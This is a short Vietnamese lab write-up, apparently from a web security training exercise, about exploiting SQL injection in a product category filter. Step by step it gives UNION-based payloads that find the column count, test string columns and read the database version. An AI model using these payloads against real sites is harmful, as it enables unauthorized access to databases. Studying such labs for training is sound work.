# Triển khai Lap
 ###### Phát hiện thấy có lỗ hổng chèn SQL trong bộ lọc danh mục sản phẩm.Khi nhập lệnh `/filter?category='ORDER BY 3-- -`
 ![alt text](image.png)
###### Tiếp tục thay đổi URL `/filter?category=' UNION SELECT NULL,NULL-- -`
![alt text](image-1.png)
###### ===>có 2 cột trong bảng này.
###### tìm phiên bản cơ sở dữ liệu.
###### Tìm xem cột nào chấp nhận kiểu dữ liệu string.
###### `' UNION SELECT 'string1','string2'-- -`
![alt text](image-2.png)
###### ===>Cả hai đều chấp nhận kiểu dữ liệu chuỗi.
###### Liệt kê phiên bản DBMS (Database Management System) version via version().
###### `' UNION SELECT NULL,version()-- -`
![alt text](image-3.png)

